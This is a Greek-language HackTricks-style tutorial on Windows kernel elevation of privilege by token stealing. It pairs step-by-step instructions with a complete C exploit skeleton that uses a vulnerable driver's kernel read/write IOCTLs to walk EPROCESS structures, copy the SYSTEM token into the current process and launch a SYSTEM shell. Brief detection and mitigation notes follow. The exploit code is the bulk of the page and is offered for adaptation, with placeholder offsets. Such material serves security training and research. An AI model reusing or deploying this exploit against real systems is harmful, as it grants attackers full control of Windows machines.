# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Επισκόπηση

Αν ένας vulnerable driver εκθέτει ένα IOCTL που παρέχει σε έναν attacker αυθαίρετες primitive για kernel read και/ή write, η ανύψωση σε NT AUTHORITY\SYSTEM μπορεί συχνά να επιτευχθεί με κλοπή ενός SYSTEM access token. Η τεχνική αντιγράφει τον δείκτη Token από το EPROCESS μιας SYSTEM process στο EPROCESS της τρέχουσας process.<sup>[[2]](#references)</sup>

Γιατί λειτουργεί:
- Κάθε process διαθέτει μια δομή EPROCESS που περιέχει, μεταξύ άλλων πεδίων, ένα Token (στην πραγματικότητα ένα EX_FAST_REF προς ένα token object).
- Η SYSTEM process (PID 4) διαθέτει ένα token με όλα τα privileges ενεργοποιημένα.
- Η αντικατάσταση του current process’ EPROCESS.Token με τον δείκτη του SYSTEM token κάνει την τρέχουσα process να εκτελείται άμεσα ως SYSTEM.<sup>[[1]](#references)</sup>

> Τα offsets στο EPROCESS διαφέρουν ανάμεσα στις εκδόσεις των Windows. Προσδιορίστε τα δυναμικά (symbols) ή χρησιμοποιήστε constants ειδικά για την έκδοση. Επίσης, θυμηθείτε ότι το EPROCESS.Token είναι ένα EX_FAST_REF (τα χαμηλά 3 bits είναι flags μετρητή αναφορών).

## Βήματα υψηλού επιπέδου

1) Εντοπίστε τη βάση του ntoskrnl.exe και επιλύστε τη διεύθυνση του PsInitialSystemProcess.
- Από user mode, χρησιμοποιήστε τα NtQuerySystemInformation(SystemModuleInformation) ή EnumDeviceDrivers για να λάβετε τις βάσεις των loaded drivers.
- Προσθέστε το offset του PsInitialSystemProcess (από symbols/reversing) στη kernel base για να λάβετε τη διεύθυνσή του.
2) Διαβάστε τον δείκτη στο PsInitialSystemProcess → πρόκειται για έναν kernel pointer προς το EPROCESS της SYSTEM.
3) Από το SYSTEM EPROCESS, διαβάστε τα offsets των UniqueProcessId και ActiveProcessLinks για να διατρέξετε τη διπλά συνδεδεμένη λίστα των δομών EPROCESS (ActiveProcessLinks.Flink/Blink), μέχρι να βρείτε το EPROCESS του οποίου το UniqueProcessId ισούται με το GetCurrentProcessId(). Διατηρήστε και τα δύο:
- EPROCESS_SYSTEM (για τη SYSTEM)
- EPROCESS_SELF (για την τρέχουσα process)
4) Διαβάστε την τιμή του SYSTEM token: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Απομονώστε τα χαμηλά 3 bits: Token_SYS_masked = Token_SYS & ~0xF (συνήθως ~0xF ή ~0x7, ανάλογα με το build· σε x64 χρησιμοποιούνται τα χαμηλά 3 bits — μάσκα 0xFFFFFFFFFFFFFFF8).
5) Option A (common): Διατηρήστε τα χαμηλά 3 bits από το current token και ενώστε τα με τον δείκτη του SYSTEM, ώστε να διατηρηθεί συνεπής ο ενσωματωμένος μετρητής αναφορών.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Γράψτε το Token_NEW πίσω στο (EPROCESS_SELF + TokenOffset) χρησιμοποιώντας το kernel write primitive σας.
7) Η τρέχουσα process είναι πλέον SYSTEM. Προαιρετικά, εκκινήστε ένα νέο cmd.exe ή powershell.exe για επιβεβαίωση.<sup>[[1]](#references)</sup>

## Ψευδοκώδικας

Παρακάτω παρουσιάζεται ένας skeleton που χρησιμοποιεί μόνο δύο IOCTLs από έναν vulnerable driver: ένα για kernel read 8-byte και ένα για kernel write 8-byte. Αντικαταστήστε τα με το interface του driver σας.<sup>[[1]](#references)</sup>
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Σημειώσεις:
- Offsets: Χρησιμοποιήστε το `dt nt!_EPROCESS` του WinDbg με τα PDBs του target ή έναν runtime symbol loader, για να λάβετε τα σωστά offsets. Μην τα hardcode-άρετε χωρίς έλεγχο.
- Mask: Στο x64 το token είναι ένα EX_FAST_REF· τα 3 χαμηλότερα bits είναι bits του reference count. Η διατήρηση των αρχικών low bits από το token σας αποτρέπει άμεσες ασυνέπειες στο refcount.
- Stability: Προτιμήστε να κάνετε elevate το τρέχον process· αν κάνετε elevate έναν short-lived helper, μπορεί να χάσετε το SYSTEM όταν τερματιστεί.<sup>[[1]](#references)</sup>

## Detection & mitigation
- Η φόρτωση unsigned ή untrusted third-party drivers που εκθέτουν ισχυρά IOCTLs είναι η root cause.
- Το Kernel Driver Blocklist (HVCI/CI), το DeviceGuard και οι κανόνες Attack Surface Reduction μπορούν να αποτρέψουν τη φόρτωση vulnerable drivers.
- Το EDR μπορεί να παρακολουθεί ύποπτες ακολουθίες IOCTL που υλοποιούν arbitrary read/write, καθώς και token swaps.

## References

- [1] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) και kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [2] [FuzzySecurity – Windows Kernel ExploitDev (παραδείγματα token stealing)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
